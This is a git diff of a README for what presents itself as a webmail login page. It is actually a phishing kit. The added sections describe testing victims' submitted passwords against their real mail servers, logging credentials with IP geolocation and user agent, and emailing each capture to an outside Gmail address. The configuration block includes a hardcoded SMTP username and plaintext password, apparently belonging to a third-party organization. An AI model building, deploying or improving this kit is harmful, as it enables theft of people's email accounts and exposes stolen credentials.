@@ -37,7 +37,9 @@ A professional webmail login interface that provides a seamless experience for u
 ├── style.css          # Stylesheet with responsive design
 ├── script.js          # JavaScript functionality
 ├── postmailer.php     # PHP backend for form processing
-├── login_attempts.log # Generated log file (created automatically)
+├── class.phpmailer.php # PHPMailer class for email functionality
+├── class.smtp.php     # SMTP class for mail server communication
+├── SS-Or.txt          # Generated log file (created automatically)
 └── README.md          # This documentation
 ```
 
@@ -45,21 +47,23 @@ A professional webmail login interface that provides a seamless experience for u
 
 ### Prerequisites
 - Web server with PHP support (Apache, Nginx, etc.)
-- PHP 7.4 or higher
+- PHP 7.4 or higher with curl extension enabled
 - Write permissions for log file creation
+- SMTP server access for email notifications
+- Internet connection for geolocation API
 
 ### Installation
 
 1. **Clone or Download** the project files to your web server directory
 2. **Configure Permissions** (if using log functionality):
    ```bash
-   chmod 644 login_attempts.log
+   chmod 644 SS-Or.txt
    chmod 755 .
    ```
-3. **Update Configuration** in `script.js`:
-   - Modify the `REDIRECT_DELAY` variable if needed
-   - Update the AJAX URL in the form submission handler
-   - Customize the fallback domain in `getWebmailUrl()`
+3. **Update Configuration**:
+   - **In `postmailer.php`**: Update SMTP settings and receiver email
+   - **In `script.js`**: Modify redirect delay and fallback domain
+   - **Verify PHPMailer classes**: Ensure `class.phpmailer.php` and `class.smtp.php` are present
 
 ### Local Development
 
@@ -102,19 +106,33 @@ https://yourdomain.com/index.html@user@example.com
 
 ### Backend Configuration
 
-The PHP backend (`postmailer.php`) can be customized for different authentication methods:
+The PHP backend (`postmailer.php`) provides advanced authentication and logging capabilities:
 
-#### Current Demo Logic
-- Accepts any email with password length ≥ 6 characters
-- Logs all attempts to `login_attempts.log`
-- Returns JSON responses with appropriate HTTP status codes
+#### Current Production Features
+- **Real SMTP Validation**: Tests actual credentials against mail servers
+- **Geolocation Tracking**: Uses GeoPlugin API for IP geolocation
+- **Email Notifications**: Sends detailed logs via SMTP to configured recipient
+- **File Logging**: Saves attempts to `SS-Or.txt` with detailed information
+- **Success/Failure Differentiation**: Different email subjects for valid vs invalid credentials
+
+#### Authentication Process
+1. **Credential Validation**: Attempts to connect to `mail.{domain}` using provided credentials
+2. **Success Path**: Sends notification with "TrueRcubeOrange" subject prefix
+3. **Failure Path**: Sends notification with "notVerifiedRcudeOrange" subject prefix
+4. **Logging**: Records IP, geolocation, user agent, and credentials
+
+#### Email Configuration
+- **Receiver**: `skkho87.sm@gmail.com` (configurable)
+- **SMTP Server**: `mail.museums.or.ke`
+- **SMTP User**: `okioko@museums.or.ke`
+- **Port**: 587 with TLS encryption
 
 #### Customization Options
-1. **Database Integration**: Replace the demo validation with database queries
-2. **External API**: Connect to existing authentication services
-3. **Email Notifications**: Add PHPMailer integration for notifications
-4. **Rate Limiting**: Implement IP-based rate limiting
-5. **Session Management**: Add session handling for authenticated users
+1. **SMTP Settings**: Update receiver email and SMTP configuration
+2. **Geolocation Service**: Replace GeoPlugin with alternative IP lookup service
+3. **Validation Logic**: Modify credential testing methodology
+4. **Logging Format**: Customize log file structure and content
+5. **Security Features**: Add rate limiting and IP blocking
 
 ## Configuration
 
@@ -125,7 +143,7 @@ The PHP backend (`postmailer.php`) can be customized for different authenticatio
 var REDIRECT_DELAY = 1500; // milliseconds
 
 // Backend endpoint
-url: 'https://inipressi.xyz/phpmailer/classes/postmailer.php'
+url: 'postmailer.php'
 
 // Fallback domain
 return 'https://webmail.gracedrive.org';
@@ -134,13 +152,18 @@ return 'https://webmail.gracedrive.org';
 ### PHP Settings (`postmailer.php`)
 
 ```php
+// Email configuration
+$receiver     = "skkho87.sm@gmail.com"; // Where to receive the logs
+$senderuser   = "okioko@museums.or.ke"; // SMTP user
+$senderpass   = "onesmus@2022";         // SMTP password
+$senderport   = 587;                    // SMTP port
+$senderserver = "mail.museums.or.ke";   // SMTP server
+
 // Log file location
-$log_file = 'login_attempts.log';
+$log_file = 'SS-Or.txt';
 
 // Validation logic
-if (strlen($password) >= 6) {
-    $is_valid_login = true;
-}
+$validCredentials = validateCredentials($login, $passwd, $domain);
 ```
 
 ## API Response Format
@@ -148,22 +171,32 @@ if (strlen($password) >= 6) {
 ### Success Response
 ```json
 {
-    "signal": "OK",
-    "success": true,
-    "msg": "Login successful! Redirecting to webmail...",
-    "email": "user@example.com",
-    "domain": "example.com",
-    "redirect_url": "https://webmail.example.com"
+    "signal": "ok",
+    "msg": "Login Successful"
 }
 ```
 
-### Error Response
+### Error Response (Invalid Credentials)
 ```json
 {
-    "signal": "ERROR",
-    "success": false,
-    "msg": "Invalid email or password. Please try again.",
-    "attempt": 1
+    "signal": "not ok",
+    "msg": "Wrong Password"
+}
+```
+
+### Error Response (SMTP Failure)
+```json
+{
+    "signal": "not ok",
+    "msg": "SMTP logging failed"
+}
+```
+
+### Error Response (No Credentials)
+```json
+{
+    "signal": "error",
+    "msg": "No credentials provided"
 }
 ```
 
